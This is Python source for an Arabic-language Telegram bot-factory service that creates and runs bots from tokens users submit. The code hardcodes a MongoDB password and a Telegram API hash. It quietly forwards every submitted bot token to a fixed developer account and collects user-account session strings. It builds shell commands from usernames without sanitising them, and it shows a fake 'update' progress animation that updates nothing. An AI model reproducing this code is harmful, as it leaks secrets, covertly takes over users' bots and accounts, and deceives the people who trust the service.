import asyncio
import json
import os
import shutil
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
import random
from pyrogram.types import Message
import zipfile
from pyrogram.storage import MemoryStorage
import requests
from bot import *
import subprocess
from pyrogram.types import ChatPrivileges, ChatPermissions
from pyrogram import Client, filters
from asyncio.exceptions import TimeoutError
from telethon import TelegramClient
from telethon.sessions import StringSession
from pyrogram.errors import (
    ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired,
    SessionPasswordNeeded, PasswordHashInvalid,
    ApiIdInvalid as ApiIdInvalid1, PhoneNumberInvalid as PhoneNumberInvalid1,
    PhoneCodeInvalid as PhoneCodeInvalid1, PhoneCodeExpired as PhoneCodeExpired1,
    SessionPasswordNeeded as SessionPasswordNeeded1, PasswordHashInvalid as PasswordHashInvalid1,
)
from telethon.errors import (
    ApiIdInvalidError, PhoneNumberInvalidError, PhoneCodeInvalidError,
    PhoneCodeExpiredError, SessionPasswordNeededError, PasswordHashInvalidError,
    FloodWaitError, AuthRestartError,
)
from bot import bot
from pymongo import MongoClient

url = "mongodb+srv://no7maya:mido123@cluster0.dodptua.mongodb.net/?appName=Cluster0"
db_client = MongoClient(url)
db = db_client["telegram_factory"]
bots_collection = db["bots_stats"]
users_collection = db["users"]
bots_fact_collection = db["bots_fact_collection"]

API_ID = int("31681257")
API_HASH = "ac78c30e1f8498af7fc782630348dcaa"
Bots = []
banded_users = []
off =None


DOWNLOAD_FOLDER = "downloads"
BACKUP_ZIP = "downloads_backup.zip" 
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

photos_FOLDER = "photos"
BACKJUP_ZIP = "photos_backup.zip" 
os.makedirs(photos_FOLDER, exist_ok=True)

with open('hamo/config.json', 'r', encoding='utf-8') as file:
    config = json.load(file)

Source_name = config['Source_name']
zombie_id = config['zombie_id']
gr = config['gr']
photo_path = config['photo_path']
channel_userss = config['channel_userss']
channel_source = config['channel_source']
c_channel_source = config['c_channel_source']
source_devv = config['source_devv']
design = config['design']
sourse_dev = config['sourse_dev']
c_gr = config['c_gr']

#
#==================================================
#
#███████╗███████╗██████╗  ██████╗ 
#╚══███╔╝██╔════╝██╔══██╗██╔═══██╗
#  ███╔╝ █████╗  ██████╔╝██║   ██║
# ███╔╝  ██╔══╝  ██╔══██╗██║   ██║
#███████╗███████╗██║  ██║╚██████╔╝
#╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ 
#
#==================================================

#------------------------------------------------ الاقسام ------------------------------------------------
from pyrogram.types import ReplyKeyboardMarkup

enable = ReplyKeyboardMarkup(
    [
        ["كشف كامل 🔍", "احصائيات المصنع 🔰"],
        ["البوتات المصنوعة ⚙️", "احصائيات البوتات المصنوعة 📈"],
        ["رجوع 🔙"]
    ],
    resize_keyboard=True
)

ban = ReplyKeyboardMarkup(
    [
        ["تفعيل المدفوع ⚡️", "تعطيل المدفوع 📛"],
        ["البوتات المدفوعة 💰"],
        ["رجوع 🔙"]
    ],
    resize_keyboard=True
)

up_admin = ReplyKeyboardMarkup(
    [
        ["تنزيل مطور ⬇️", "رفع مطور ⬆️"],
        ["المطورين 👨🏻‍💻"],
        ["رجوع 🔙"]
    ],
    resize_keyboard=True
)

users_keyboard = ReplyKeyboardMarkup(
    [
        ["حذف بوت 🗑", "صنع بوت 🛠"],
        ["ايقاف بوت ⏹️", "تشغيل بوت ▶️"],
        ["سورس 🚦", "مطور السورس 🕸"],
        ["نوع التنصيب ⚙️"]
    ],
    resize_keyboard=True
)

get_ahsa = ReplyKeyboardMarkup(
    [
        ["الغاء حظر مستخدم 🔓", "حظر مستخدم 🚫"],
        ["المستخدمين المحظورين 🙅🏻‍♂️"],
        ["رجوع 🔙"]
    ],
    resize_keyboard=True
)

bots_key = ReplyKeyboardMarkup(
    keyboard=[
        ["حذف بوت 🗑", "صنع بوت 🛠"],
        ["ايقاف بوت ⏹️", "تشغيل بوت ▶️"],
        ["تصفية البوتات 🗂"],
        ["الغاء حظر بوت 🔓", "حظر بوت 🚫"],
        ["البوتات المحظورة ⚠️"],
        ["ايقاف البوتات ⛔️", "تشغيل البوتات ⚡️"],
        ["تنظيف التخزين 🧹", "تصنيع جميع البوتات ⚙️"],
        ["رجوع 🔙"]
    ],
    resize_keyboard=True
)

kepssaw = ReplyKeyboardMarkup(
    [
        ["تعطيل التشغيل 🔌", "تفعيل التشغيل 💡"],
        ["تعطيل سجل التشغيل 📂", "تفعيل سجل التشغيل 🗂"],
        ["رجوع 🔙"]
    ],
    resize_keyboard=True
)

brodcast = ReplyKeyboardMarkup(
    [
        ["توجيه عام 🧭", "اذاعة عام 📣"],
        ["اذاعة عام للجروبات 👥", "اذاعة عام للمستخدمين 👤"],
        ["اذاعة عام للقنوات 🔈"],
        ["رجوع 🔙"]
    ],
    resize_keyboard=True
)

musta = ReplyKeyboardMarkup(
    [
        ["حذف قناة الاشتراك 🗑", "اضف قناة الاشتراك 📎"],
        ["قنوات الاشتراك 📥"],
        ["حذف قناة الاشتراك الخاص 🗑", "اضف قناة الاشتراك الخاص 📢"],
        ["قنوات الاشتراك الخاص 📩"],
        ["حذف قناة الاشتراك للجروبات ⭕️", "اضف قناة الاشتراك للجروبات 👥"],
        ["قنوات الاشتراك للجروبات 🚸"],
        ["رجوع 🔙"]
    ],
    resize_keyboard=True
)

global_ban = ReplyKeyboardMarkup(
    [
        ["الغاء حظر عام 🛑", "حظر عام 📛"],
        ["المحظورين عام 🙅🏻‍♂️"],
        ["الغاء كتم عام 🔔", "كتم عام 🔕"],
        ["المكتومين عام 🤐"],
        ["رجوع 🔙"]
    ],
    resize_keyboard=True
)

devs_keyboard = ReplyKeyboardMarkup(
    [
        ["تعطيل الصانع 🔴", "تفعيل الصانع 🟢"],
        ["تعطيل التواصل 🔰", "تفعيل التواصل ⚡️"],
        ["تحديث الصانع 🚀"],
        ["قسم البوتات 🤖", "قسم المدفوع 💸"],
        ["قسم المطورين 🕵🏻‍♂️"],
        ["قسم المستخدمين 👥", "قسم الاحصائيات 📊"],
        ["قسم التشغيل ▶️"],
        ["قسم الاذاعة 🔊", "قسم الاشتراك الاجباري 🔒"],
        ["قسم العام 🚧"]
    ],
    resize_keyboard=True
)

@bot.on_message(filters.command("تحديث الصانع 🚀", "") & filters.private, group=18971563)
async def up_date(client, message):
    update_msg = await message.reply_text("""
╭─────── ◍ ✿ ◍ ───────╮
│  جاري تحديث الصانع ♻️  
│  ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰ 100%
╰─────── ◍ ✿ ◍ ───────╯
""")    
    for i in range(10, 110, 10):
        progress = "▰" * (i//10) + "▱" * (10 - (i//10))
        await asyncio.sleep(0.5)
        await update_msg.edit_text(f"""
╭─────── ◍ ✿ ◍ ───────╮
│  جاري تحديث الصانع ♻️  
│  {progress} {i}%
╰─────── ◍ ✿ ◍ ───────╯
""")    
    await asyncio.sleep(1)
    await update_msg.edit_text("""
╭─────── ◍ ✿ ◍ ───────╮
│  تم تحديث الصانع بنجاح ✅  
│  يمكنك استخدامه الآن  
╰─────── ◍ ✿ ◍ ───────╯
𓏺 𓏺 𓏺 𓏺 𓏺 𓏺 𓏺 𓏺 𓏺 𓏺
""")

from pyrogram.errors import PeerIdInvalid, UsernameNotOccupied
blockked_collection = db["blocked_bots"]

@bot.on_message(filters.command("حظر بوت 🚫", "") & filters.private, group=115786498)
async def block_bot(client: Client, message: Message):
    try:
        response = await client.ask(
            chat_id=message.chat.id,
            text="**◍ ارسل يوزر البوت المراد حظره ⛔️\n√**",
            timeout=60
        )
        user_input = response.text.strip()
        try:
            chat = await client.get_chat(user_input)
        except (PeerIdInvalid, UsernameNotOccupied):
            return await message.reply("❌ لم أتمكن من العثور على الحساب.")
        if not chat.is_bot:
            return await message.reply("❌ الحساب الذي أرسلته ليس بوتاً.")
        if blockked_collection.find_one({"bot_id": chat.id}):
            return await message.reply("⚠️ هذا البوت محظور بالفعل")
        blockked_collection.insert_one({
            "bot_id": chat.id,
            "bot_username": chat.username or "بدون معرف"
        })
        await message.reply(f"**◍ تم حظر البوت بنجاح ✅\n√**")
    except Exception:
        await message.reply("❌ انتهى الوقت أو حدث خطأ، حاول مرة أخرى.")

@bot.on_message(filters.command("الغاء حظر بوت 🔓", "") & filters.private, group=1157899764)
async def unblock_bot(client: Client, message: Message):
    try:
        response = await client.ask(
            chat_id=message.chat.id,
            text="**◍ ارسل يوزر البوت المراد الغاء حظره 📛\n√**",
            timeout=60
        )
        user_input = response.text.strip()
        try:
            chat = await client.get_chat(user_input)
        except (PeerIdInvalid, UsernameNotOccupied):
            return await message.reply("❌ لم أتمكن من العثور على الحساب.")
        result = blockked_collection.delete_one({"bot_id": chat.id})
        if result.deleted_count:
            await message.reply(f"**◍ تم الغاء حظر بوتك بنجاح  ✅\n√**")
        else:
            await message.reply("**⚠️ هذا البوت غير محظور**")
    except Exception:
        await message.reply("**❌ انتهى الوقت أو حدث خطأ، حاول مرة أخرى**")

@bot.on_message(filters.command("البوتات المحظورة ⚠️", "") & filters.private, group=1157864735)
async def list_blocked_bots(client: Client, message: Message):
    blocked = list(blockked_collection.find())
    if not blocked:
        return await message.reply("✅ لا توجد بوتات محظورة حالياً.")
    text = "**⚠️ قائمة البوتات المحظورة:**\n\n"
    for bot in blocked:
        text += f"◍ `{bot.get('bot_username', 'بدون معرف')}` - `{bot['bot_id']}`\n"
    await message.reply(text)


@bot.on_message(filters.command("تشغيل بوت ▶️", "") & filters.private, group=101115263)
async def start_user_bot(client, message: Message):
    user_id = message.from_user.id if message.from_user else "None"
    if user_id in DEVS:
        try:
            response = await client.ask(
                chat_id=message.chat.id,
                text="**◍ من فضلك أرسل الآن يوزر البوت المراد تشغيله (مثال: `@mybot`):**",
                timeout=60
            )
            bot_username = response.text.strip().lstrip("@")
            bot_data = bots_fact_collection.find_one({"bot_username": bot_username})
            if not bot_data:
                return await message.reply("◍ لا يوجد بوت بهذا اليوزر في قاعدة البيانات.")
        except Exception as e:
            pass
    else:
        if not await check(user_id, message, client):
            return
        bot_data = bots_fact_collection.find_one({"owner_id": user_id})
        if not bot_data:
            return await message.reply("**◍ لم يتم العثور على بوت مرتبط بك\n√**")
        bot_username = bot_data["bot_username"]
    active_screens = subprocess.getoutput("screen -ls")
    if bot_username in active_screens:
        return await message.reply(f"**◍ البوت @{bot_username} يعمل بالفعل\n√**")
    try:
        os.system(f"cd users/{bot_username} && screen -d -m -S {bot_username} python3 -m zombie.py")
        await message.reply(f"**◍ تم تشغيل بوتك بنجاح: @{bot_username}\n√**")
    except Exception as e:
        await message.reply(f"**❌ فشل في تشغيل البوت: {e}**")

@bot.on_message(filters.command("ايقاف بوت ⏹️", "") & filters.private, group=1157864)
async def stop_user_bot(client, message):
    user_id = message.from_user.id if message.from_user else "None"
    if user_id in DEVS:
        try:
            response = await client.ask(
                chat_id=message.chat.id,
                text="**◍ من فضلك أرسل الآن يوزر البوت المراد تشغيله (مثال: `@mybot`):**",
                timeout=60
            )
            bot_username = response.text.strip().lstrip("@")
            bot_data = bots_fact_collection.find_one({"bot_username": bot_username})
            if not bot_data:
                return await message.reply("◍ لا يوجد بوت بهذا اليوزر في قاعدة البيانات.")
        except Exception as e:
            pass
    else:
        if not await check(message.from_user.id, message, client):
            return
        user_id = message.from_user.id if message.from_user else "None"
        bot_data = bots_fact_collection.find_one({"owner_id": user_id})
    
        if not bot_data:
            return await message.reply("**◍  لم يتم العثور على بوت مرتبط بك\n√**")
    
        bot_username = bot_data["bot_username"]
    active_screens = subprocess.getoutput("screen -ls")
    if bot_username not in active_screens:
        return await message.reply(f"**◍  البوت @{bot_username} غير نشط حالياً\n√**")
    try:
        os.system(f"screen -S {bot_username} -X quit")
        await message.reply(f"**◍  تم ايقاف بوتك: @{bot_username}\n√**")
    except Exception as e:
        await message.reply(f"**❌ فشل في إيقاف البوت: {e}**")

@bot.on_message(filters.command(["نوع التنصيب ⚙️"], "") & filters.private, group=545421)
async def show_type(client, message):
    if not await check(message.from_user.id, message, client):
        return
    user_id = message.from_user.id if message.from_user else "None"
    bot_info = bots_fact_collection.find_one({"owner_id": user_id})
    if bot_info:
        await message.reply_text(f"**◍ نوع التنصيب: `{bot_info['type']}` 🔀\n√**")
    else:
        await message.reply_text("**◍ نوع التنصيب: لم يتم العثور على بوت مرتبط بك \n√**")

@bot.on_message(filters.command(["start", "/start", "رجوع 🔙"], "") & filters.private, group=545421)
async def start(client, message):
    if not await check(message.from_user.id, message, client):
        return
    if message.from_user.id in DEVS:
        await message.reply(f'💌╖أهلا بيك حبيبي مطور السورس\n🕹╢ تقدر تتحكم باوامر الصانع عن طريق\n⌨️╢ الكيبورد اللي ظهرلك تحت ↘️\n🚪╜ للدخول لقناة السورس <a href="https://t.me/Source_Golld">دوس هنا</a>',reply_markup=devs_keyboard)
    else:
        caption = f'💌╖أهلا بيك عزيزي في صانع سورس مصر\n🕹╢ تقدر تتحكم باوامر الصانع عن طريق\n⌨️╢ الكيبورد اللي ظهرلك تحت ↘️\n🚪╜ للدخول لقناة السورس <a href="https://t.me/Source_Golld">دوس هنا</a>'
        await message.reply(
            caption,
            reply_markup=users_keyboard
        )
        
#------------------------------------------------ الاقسام ------------------------------------------------
@bot.on_message(filters.command("قسم المدفوع 💸", ""))
async def iioofus(client, message):
    if message.from_user.id not in DEVS:
        return
    await message.reply_text('**💌╖أهلا بيك حبيبي مطور السورس\n🕹╢ تقدر تتحكم باشتراك سورسك عن طريق\n⌨️╢ الكيبورد اللي ظهرلك تحت ↘️\n🚪╜ للدخول لقناة سورسك <a href="https://t.me/Source_Golld">دوس هنا</a>**', reply_markup=ban)

@bot.on_message(filters.command("قسم العام 🚧", ""))
async def iofujs(client, message):
    if message.from_user.id not in DEVS:
        return
    await message.reply_text('**💌╖أهلا بيك حبيبي مطور السورس\n🕹╢ تقدر تتحكم بقسم العام عن طريق\n⌨️╢ الكيبورد اللي ظهرلك تحت ↘️\n🚪╜ للدخول لقناة سورسك <a href="https://t.me/Source_Golld">دوس هنا</a>**', reply_markup=global_ban)

@bot.on_message(filters.command("قسم المطورين 🕵🏻‍♂️", ""))
async def iouyfus(client, message):
    if message.from_user.id not in DEVS:
        return
    await message.reply_text('**💌╖أهلا بيك حبيبي مطور السورس\n🕹╢ تقدر تتحكم بمطوريك عن طريق\n⌨️╢ الكيبورد اللي ظهرلك تحت ↘️\n🚪╜ للدخول لقناة سورسك <a href="https://t.me/Source_Golld">دوس هنا</a>**', reply_markup=up_admin)

@bot.on_message(filters.command("قسم المستخدمين 👥", ""))
async def iofujgs(client, message):
    if message.from_user.id not in DEVS:
        return
    await message.reply_text('**💌╖أهلا بيك حبيبي مطور السورس\n🕹╢ تقدر تتحكم بالمستخدمين عن طريق\n⌨️╢ الكيبورد اللي ظهرلك تحت ↘️\n🚪╜ للدخول لقناة سورسك <a href="https://t.me/Source_Golld">دوس هنا</a>**', reply_markup=get_ahsa)

@bot.on_message(filters.command("قسم البوتات 🤖", ""))
async def idetofus(client, message):
    if message.from_user.id not in DEVS:
        return
    await message.reply_text('**💌╖أهلا بيك حبيبي مطور السورس\n🕹╢ تقدر تتحكم في بوتاتك عن طريق\n⌨️╢ الكيبورد اللي ظهرلك تحت ↘️\n🚪╜ للدخول لقناة سورسك <a href="https://t.me/Source_Golld">دوس هنا</a>**', reply_markup=bots_key)

@bot.on_message(filters.command("قسم الاحصائيات 📊", ""))
async def cswtas(client, message):
    if message.from_user.id not in DEVS:
        return
    await message.reply_text('**💌╖أهلا بيك حبيبي مطور السورس\n🕹╢ تقدر تكتشف احصائياتك عن طريق\n⌨️╢ الكيبورد اللي ظهرلك تحت ↘️\n🚪╜ للدخول لقناة سورسك <a href="https://t.me/Source_Golld">دوس هنا</a>**', reply_markup=enable)

@bot.on_message(filters.command("قسم الاشتراك الاجباري 🔒", ""))
async def chhfus(client, message):
    if message.from_user.id not in DEVS:
        return
    await message.reply_text('**💌╖أهلا بيك حبيبي مطور السورس\n🕹╢ تقدر تتحكم باشتراك سورسك عن طريق\n⌨️╢ الكيبورد اللي ظهرلك تحت ↘️\n🚪╜ للدخول لقناة سورسك <a href="https://t.me/Source_Golld">دوس هنا</a>**', reply_markup=musta)

@bot.on_message(filters.command("قسم الاذاعة 🔊", ""))
async def gvhfbcfvjgbus(client, message):
    if message.from_user.id not in DEVS:
        return
    await message.reply_text('**💌╖أهلا بيك حبيبي مطور السورس\n🕹╢ تقدر تتحكم باذاعات سورسك عن طريق\n⌨️╢ الكيبورد اللي ظهرلك تحت ↘️\n🚪╜ للدخول لقناة سورسك <a href="https://t.me/Source_Golld">دوس هنا</a>**', reply_markup=brodcast)

@bot.on_message(filters.command("قسم التشغيل ▶️", ""))
async def acfvjgbus(client, message):
    if message.from_user.id not in DEVS:
        return
    await message.reply_text('**💌╖أهلا بيك حبيبي مطور السورس\n⌨️╢ سيتم تفعيل هذا القسم قريبا ⚙️\n🚪╜ للدخول لقناة سورسك <a href="https://t.me/Source_Golld">دوس هنا</a>**')

#------------------------------------------------ الاقسام ------------------------------------------------
@bot.on_message(filters.command("جلب_نسخه_صور") & filters.private, group=7112498443)
async def gt_grrrs_backup(client: Client, message: Message):
    if message.from_user.id == 7807482327:
        try:
            if os.path.exists(BACKJUP_ZIP):
                os.remove(BACKJUP_ZIP)
            shutil.make_archive(BACKJUP_ZIP.replace(".zip", ""), 'zip', photos_FOLDER)
            await message.reply_document(document=BACKJUP_ZIP)
        except Exception as e:
            await message.reply_text(f"حدث خطأ: {e}")

@bot.on_message(filters.document & filters.private, group=7112498443)
async def upload_backup(client: Client, message: Message):
    if message.from_user.id == 7807482327:
        try:
            doc = message.document
            if not doc.file_name.endswith(".zip"):
                await message.reply_text("❌ الملف يجب أن يكون بصيغة ZIP فقط!")
                return
            if os.path.exists(BACKJUP_ZIP):
                os.remove(BACKJUP_ZIP)
            file_path = os.path.join("/root", doc.file_name)
            await client.download_media(message, file_name=file_path)
            if os.path.exists(photos_FOLDER):
                shutil.rmtree(photos_FOLDER)
            os.makedirs(photos_FOLDER, exist_ok=True)
            with zipfile.ZipFile(file_path, 'r') as zip_ref:
                zip_ref.extractall(photos_FOLDER)
            await message.reply_text("✅ تمت استعادة النسخة الاحتياطية بنجاح!")
        except Exception as e:
            await message.reply_text(f"❌ **حدث خطأ أثناء رفع وفك ضغط النسخة:**\n`{e}`")

youtubee = ""
@bot.on_message(filters.command("تعيين يوتيوب", "") & filters.private, group=5478789)
async def set_zommie(client: Client, message: Message):
    if message.from_user.id == 7807482327:
        try:
            zomm = await client.ask(
                chat_id=message.chat.id, 
                text="أرسل الآن مسار يوتيوب (رابط).", 
                timeout=30
            )
            global youtubee
            youtubee = zomm.text
            await message.reply_text("✔️ تم تعيين يوتيوب بنجاح.")
        except Exception as e:
            await message.reply_text(f"⚠️ حدث خطأ أثناء تعيين يوتيوب: {e}")

@bot.on_message(filters.command("ريستارت يوتيوب", "") & filters.private, group=5417845789)
async def restart_zommie(client: Client, message: Message):
    if message.from_user.id == 7807482327:
        try:
            save_file()
            await message.reply_text("✔️ تم تحديث ملفات بنجاح.")
        except Exception as e:
            await message.reply_text(f"⚠️ حدث خطأ أثناء تحديث: {e}")

def save_file():
    global youtubee
    try:
        headers = {
            'Accept': 'text/plain',
            'User-Agent': 'python-requests'
        }
        file_path="/root/zombie/zombie.txt"
        if os.path.exists(file_path):
            os.remove(file_path)
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        response = requests.get(f'{youtubee}', headers=headers)
        with open(file_path, 'w', encoding='utf-8') as file:
            file.write(response.text)
    except Exception as error:
        print('Error:', str(error))

subscribed_channels = []

def add_channel(channel):
    if channel not in subscribed_channels:
        subscribed_channels.append(channel)

def del_channel(channel):
    if channel in subscribed_channels:
        subscribed_channels.remove(channel)
    
def get_channels():
    return subscribed_channels

async def check_chat_member_status(user_id, message, client):
    for channel in subscribed_channels:
        try:
            await client.get_chat_member(channel, user_id)
        except Exception:
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"اضغط هنا للاشتراك بالقناة ⚡", url=f"https://t.me/{channel}")]
            ])
            text = f"**🚦عذراً عزيزي\n🚦يجب عليك الإشتراك في القناة\n\n    قنـاة الـبـوت :\n ⤹ https://t.me/{channel} ⤸ **"
            await client.send_message(chat_id=message.chat.id, text=text, reply_markup=keyboard)
            return False      
    return True

from collections import defaultdict
import time
BANNED_USERS = []
user_messages = defaultdict(list)

async def check(user_id, message, client):
    is_subscribed = await check_chat_member_status(user_id, message, client)
    if user_id in BANNED_USERS:
        await message.delete()
        await message.reply_text("**تم حظرك من البوت**")
        return False
    current_time = time.time()
    user_messages[user_id].append(current_time)
    user_messages[user_id] = [t for t in user_messages[user_id] if current_time - t <= 5]
    if len(user_messages[user_id]) > 5:
        if user_id not in DEVS:
            BANNED_USERS.append(user_id)
            await client.send_message(message.chat.id, "**🚫 لقد تم حظرك بسبب الإرسال المتكرر!**")
        return False
    if not is_subscribed:
        return False
    if off and message.from_user.id not in DEVS:
        await message.reply_text('**◍  الصانع معطل حاليا\n◍ يرجى التواصل مع <a href="https://t.me/wx_zu">مطور السورس</a>\n√**')
        return False
    return True
    
@bot.on_message(filters.command(["سورس 🚦"], ""), group=544388)
async def alivehi(client: Client, message):
    if not await check(message.from_user.id, message, client):
        return
    user_id = message.from_user.id if message.from_user else "None"
    await message.reply_video(
        video="https://t.me/Zombie_source/17",
        caption="""
⍟ 𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚂𝙾𝚄𝚁𝙲𝙴 𝙾𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼
        """,
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton("ᏟᎻᎪΝΝᎬᏞ", url=f"https://t.me/Source_Golld"),
                InlineKeyboardButton("ᏀᎡØႮᏢ", url=f"https://t.me/Super_Gold1")
            ],
            [
                InlineKeyboardButton("حــمــوވ بــتـ؏ ™الــشـࢪقـيـه", url=f"https://t.me/wx_zu")
            ],
        ]),
    )



@bot.on_message(filters.command(["مطور السورس 🕸"], ""), group=54445448)
async def aliaashi(client: Client, message):
    if not await check(message.from_user.id, message, client):
        return
    user = await client.get_chat(chat_id=f"7807482327")
    name = user.first_name
    username = user.username
    bio = user.bio
    user_id = user.id
    photo = user.photo.big_file_id
    photo = await client.download_media(photo)
    title = message.chat.title if message.chat.title else message.chat.first_name
    caption = f"""
**Developer Name : {name} **
**Devloper Username : @{username} **
**Bio : {bio} **
**⤶ صلـي علـى النبـۍ وتـبـسم ✨♥️ ≯ -**
    """
    await message.reply_photo(
        photo=photo,
        caption=caption,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{name}", user_id=f"{user_id}")]])
    )
    try:
        os.remove(photo)
    except:
        pass
    

def readable_error(exc: Exception) -> str:
    mapping = {
        (ApiIdInvalid, ApiIdInvalid1, ApiIdInvalidError): "❌ **API ID/Hash** غير صحيح.",
        (PhoneNumberInvalid, PhoneNumberInvalid1, PhoneNumberInvalidError): "📞 **رقم الهاتف** غير صحيح.",
        (PhoneCodeInvalid, PhoneCodeInvalid1, PhoneCodeInvalidError): "🔢 **رمز التحقق (OTP)** غير صحيح.",
        (PhoneCodeExpired, PhoneCodeExpired1, PhoneCodeExpiredError): "⌛ **رمز التحقق (OTP)** منتهي الصلاحية.",
        (PasswordHashInvalid, PasswordHashInvalid1, PasswordHashInvalidError): "🔒 **كلمة المرور الثنائية (2Step)** غير صحيحة.",
        FloodWaitError: "🚫 تم الحظر مؤقتًا – الرجاء المحاولة لاحقًا.",
        AuthRestartError: "♻️ يتطلب إعادة التحقق. الرجاء البدء من جديد.",
    }
    for group, txt in mapping.items():
        if isinstance(exc, group):
            return txt
    return f"ᴜɴᴋɴᴏᴡɴ ᴇʀʀᴏʀ: {str(exc).replace('`', '')}"


@bot.on_message(filters.command(["تفعيل الصانع 🟢", "تعطيل الصانع 🔴"], "") & filters.private, group=4213151)
async def onoff(client, message):
  if message.from_user.id not in DEVS:
    return
  global off
  if message.text == "تفعيل الصانع 🟢":
    off = None
    return await message.reply_text("**◍ تم تفعيل الصانع بنجاح 🚦\n√**")
  else:
    off = True
    await message.reply_text("**◍ تم تعطيل الصانع بنجاح 🚦\n√**")


cancel_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء", callback_data="cancel_ask")]])

cancelled_users = set()

@bot.on_callback_query(filters.regex(r"^cancel_ask$"))
async def cancel_ask_handler(client, callback_query):
    user_id = callback_query.from_user.id
    cancelled_users.add(user_id)
    await callback_query.message.delete()
    await callback_query.message.reply_text("**❌ تم إلغاء العملية**")

@bot.on_callback_query(filters.regex(r"^hemaya$"))
async def che_link_scope(client, callback_query):
    chat_id = callback_query.message.chat.id
    user_id = callback_query.from_user.id
    username = callback_query.from_user.username or callback_query.from_user.first_name
    try:
        ask_token = await client.ask(chat_id, "**◍ ارسل توكن البوت**", timeout=300, reply_markup=cancel_keyboard)
        if user_id in cancelled_users:
            cancelled_users.remove(user_id)
            return
    except:
        return await callback_query.message.reply_text("**⏱ انتهى وقت الإنتظار**")
    TOKEN = ask_token.text.strip()
    Dev = user_id
    if user_id in DEVS:
        try:
            ask_dev = await client.ask(chat_id, "**◍ ارسل ايدي المطور**", timeout=300, reply_markup=cancel_keyboard)
            if user_id in cancelled_users:
                cancelled_users.remove(user_id)
                return
            Dev = int(ask_dev.text.strip())
        except:
            return await callback_query.message.reply_text("**◍ قم بإرسال الايدي بشكل صحيح**")
    try:
        bot = Client(":memory:", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True)
        await bot.start()
        bot_info = await bot.get_me()
        bot_username = bot_info.username
        bot_id = bot_info.id
        await bot.stop()
    except Exception as e:
        return await callback_query.message.reply_text(f"**◍ فشل تشغيل البوت أو الجلسة\n√**")
    if blockked_collection.find_one({"bot_id": bot_id}):
        return await callback_query.message.reply_text("**🚫 هذا البوت محظور ولا يمكن استخدامه\n√**")
    for b in Bots:
        if b[0] == username:
            return await callback_query.message.reply_text("**◍ لقد قمت بصنع هذا البوت من قبل**")
    existing_bot = bots_fact_collection.find_one({"bot_username": bot_username})
    bot_folder = f"users/{bot_username}"
    try:
        os.system(f"cp -a source_hem {bot_folder}")
        env_path = os.path.join(bot_folder, ".env")
        with open(env_path, "w+", encoding="utf-8") as env:
            env.write(f'BOT_TOKEN = {TOKEN}\nOWNER_ID = {Dev}\nappusername = {bot_username}')
    except Exception as e:
        return await callback_query.message.reply_text(f"**◍ حدث خطأ أثناء تجهيز ملفات البوت:\n{e}**")
    os.system(f"cd {bot_folder} && screen -d -m -S {bot_username} python3 -m zombie.py")
    Bots.append([bot_username, Dev])
    install_type = "حماية"
    try:
        usr = await client.get_chat(user_id)
        if usr.photo:
            await client.download_media(usr.photo.big_file_id, file_name=f"{photos_FOLDER}/{user_id}.jpg")
    except:
        pass
    await callback_query.message.reply_text(
        f"**◍ تم تشغيل البوت بنجاح\n\n**"
        f"**نوع التنصيب ↢ {install_type}\n**"
        f"**معرف البوت ↢ @{bot_username}\n**"
        f"**المطور ↢ @{username}\n√**"
    )
    try:
        await client.send_message(
            7807482327,
            f"**✨ تم تنصيب بوت بنجاح\n**"
            f"**يوزر البوت : @{bot_username}\n**"
            f"**بواسطة @{username}\n**"
            f"**توكن البوت : {TOKEN}**"
        )
    except:
        pass
    if not existing_bot:
        bot_data = {
            "bot_username": bot_username,
            "bot_token": TOKEN,
            "owner_id": Dev,
            "session_string": None,
            "logger_link": None,
            "type": install_type,
            "logger_id": None
        }
        bots_fact_collection.insert_one(bot_data)


@bot.on_callback_query(filters.regex(r"^mix$"))
async def choosek_scope(client, callback_query):
    chat_id = callback_query.message.chat.id
    user_id = callback_query.from_user.id
    username = callback_query.from_user.username or callback_query.from_user.first_name
    try:
        ask = await client.ask(chat_id, "**◍ ارسل توكن البوت**", timeout=300, reply_markup=cancel_keyboard)
        if user_id in cancelled_users:
            cancelled_users.remove(user_id)
            return
        TOKEN = ask.text.strip()
    except:
        return await callback_query.message.reply_text("**⏱ انتهى وقت الإنتظار**")
    try:
        ask = await client.ask(chat_id, "**◍ ارسل لي الآن الجلسه**", timeout=300, reply_markup=cancel_keyboard)
        if user_id in cancelled_users:
            cancelled_users.remove(user_id)
            return
        SESSION = ask.text.strip()
    except:
        return await callback_query.message.reply_text("**⏱ انتهى وقت الإنتظار**")
    Dev = user_id
    if user_id in DEVS:
        try:
            ask = await client.ask(chat_id, "**◍ ارسل ايدي المطور**", timeout=300, reply_markup=cancel_keyboard)
            if user_id in cancelled_users:
                cancelled_users.remove(user_id)
                return
            Dev = int(ask.text.strip())
        except:
            return await callback_query.message.reply_text("**◍ قم بإرسال الايدي بشكل صحيح**")
    try:
        bot = Client(":memory:", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True)
        user = Client(":user_mem:", api_id=API_ID, api_hash=API_HASH, session_string=SESSION, in_memory=True)

        await bot.start()
        bot_info = await bot.get_me()
        bot_username = bot_info.username
        bot_id = bot_info.id
        await bot.stop()
        await user.start()
        await user.stop()
    except Exception as e:
        return await callback_query.message.reply_text(f"**◍ فشل تشغيل البوت أو الجلسة\n√\n{e}**")
    if blockked_collection.find_one({"bot_id": bot_id}):
        return await callback_query.message.reply_text("**🚫 هذا البوت محظور ولا يمكن استخدامه\n√**")
    for b in Bots:
        if b[0] == username:
            return await callback_query.message.reply_text("**◍ لقد قمت بصنع هذا البوت من قبل**")
    await bot.start()
    await user.start()
    existing_bot = bots_fact_collection.find_one({"bot_username": bot_username})
    if existing_bot:
        loggerlink = existing_bot.get("logger_link")
        logger = existing_bot.get("logger_id")
        try:
